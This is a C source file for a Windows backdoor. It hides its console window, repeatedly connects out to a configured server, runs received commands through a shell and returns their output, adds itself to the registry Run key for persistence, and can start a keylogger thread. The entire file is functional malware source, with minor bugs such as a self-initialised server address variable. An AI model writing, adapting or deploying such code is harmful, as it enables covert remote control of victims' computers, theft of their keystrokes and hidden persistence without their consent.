#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 50004

int sock;

int bootRun() {
    char err[128] = "Failed\n";
    char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);

    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);

    if (RegSetValueEx(NewVal, TEXT("WOO"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0; 
}

char * str_cut(char str[], int slice_from, int slice_to) {

    if (str[0] == '\0') {
        return NULL;
    }

    char *buffer;
    size_t str_len, buffer_len;

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str);

        if (abs(slice_to) > str_len - 1) {
            return NULL;
        }

        if (abs(slice_from) > str_len) {
            slice_from = (-1) * str_len;
        }

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);

    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        if (slice_from > str_len - 1) {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += slice_from;

    } else {
        return NULL;
    }

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;

}

void CloseConnection(int sock) {
    closesocket(sock);
    WSACleanup();
    exit(0);
}

void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1) {

        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        int recv_size = recv(sock, buffer, sizeof(buffer), 0);

        if (recv_size <= 0) {
            CloseConnection(sock);
        }

        if (strncmp("q", buffer, 1) == 0) {
            CloseConnection(sock);
        }

        else if(strncmp("cd ", buffer, 3) == 0) {
            char* path = str_cut(buffer, 3, 100);
            if (path) {
                chdir(path);
                free(path);
            }
        }

        else if(strncmp("persist", buffer, 7) == 0) {
            bootRun();
        }

        else if(strncmp("keylog_start", buffer, 12) == 0) {
            HANDLE hThread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            if (hThread == NULL) {
                char errMsg[] = "Failed to start keylogger\n";
                send(sock, errMsg, sizeof(errMsg), 0);
            } else {
                CloseHandle(hThread);
            }
        }

        else {
            FILE *fp = _popen(buffer, "r");
            if (fp == NULL) {
                char errMsg[] = "Failed to execute command\n";
                send(sock, errMsg, sizeof(errMsg), 0);
                continue;
            } else if (fp) {
                while(fgets(container, sizeof(container), fp) != NULL) {
                    strcat(total_response, container);
                }
    
                send(sock, total_response, sizeof(total_response), 0);
                fclose(fp);
            }
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int hCmdShow) {
    HWND stealth;
    AllocConsole();
    stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);

    struct sockaddr_in ServAddr;
    WSADATA wsaData;

    char *ServIP = ServIP;
    unsigned short ServPort = ServPort;

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    memset(&ServAddr, 0, sizeof(ServAddr));

    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(5000);
    }

    Shell();
    
}